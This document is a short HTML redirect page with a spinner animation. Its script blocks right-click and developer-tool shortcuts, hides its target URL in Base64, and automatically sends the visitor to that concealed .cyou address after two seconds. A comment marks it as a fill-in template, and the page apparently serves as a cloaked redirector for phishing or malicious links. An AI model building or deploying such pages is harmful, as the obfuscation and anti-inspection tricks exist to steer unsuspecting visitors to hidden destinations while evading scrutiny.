<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirecting...</title>

<style>
    body {
        margin: 0;
        background: #ffffff;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .dot-spinner {
        --size: 70px;
        width: var(--size);
        height: var(--size);
        position: relative;
    }

    .dot-spinner div {
        width: 10px;
        height: 10px;
        background: #5659a8;
        border-radius: 50%;
        position: absolute;
        top: calc(50% - 5px);
        left: calc(50% - 5px);
        transform-origin: 35px 35px;
        animation: blink 1.2s infinite ease-in-out;
        opacity: 0.2;
    }

    .dot-spinner div:nth-child(1) { transform: rotate(0deg) translate(30px); animation-delay: 0s; }
    .dot-spinner div:nth-child(2) { transform: rotate(45deg) translate(30px); animation-delay: 0.15s; }
    .dot-spinner div:nth-child(3) { transform: rotate(90deg) translate(30px); animation-delay: 0.3s; }
    .dot-spinner div:nth-child(4) { transform: rotate(135deg) translate(30px); animation-delay: 0.45s; }
    .dot-spinner div:nth-child(5) { transform: rotate(180deg) translate(30px); animation-delay: 0.6s; }
    .dot-spinner div:nth-child(6) { transform: rotate(225deg) translate(30px); animation-delay: 0.75s; }
    .dot-spinner div:nth-child(7) { transform: rotate(270deg) translate(30px); animation-delay: 0.9s; }
    .dot-spinner div:nth-child(8) { transform: rotate(315deg) translate(30px); animation-delay: 1.05s; }

    @keyframes blink {
        0%, 20% { opacity: 1; }
        50%, 100% { opacity: 0.2; }
    }
</style>

<script>
// Disable right click
document.addEventListener("contextmenu", e => e.preventDefault());

// Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+C
document.onkeydown = function(e) {
    if (
        e.keyCode === 123 ||
        (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 67)) ||
        (e.ctrlKey && e.keyCode === 85)
    ) {
        return false;
    }
};

// Sir inserts Base64 here
const encoded = "aHR0cHM6Ly90ZWtvbi5jeW91L2NvbXQv";

// Redirect after 2 seconds
setTimeout(() => {
    window.location.href = atob(encoded);
}, 2000);
</script>

</head>
<body>
    <div class="dot-spinner">
        <div></div><div></div><div></div><div></div>
        <div></div><div></div><div></div><div></div>
    </div>
</body>
</html>
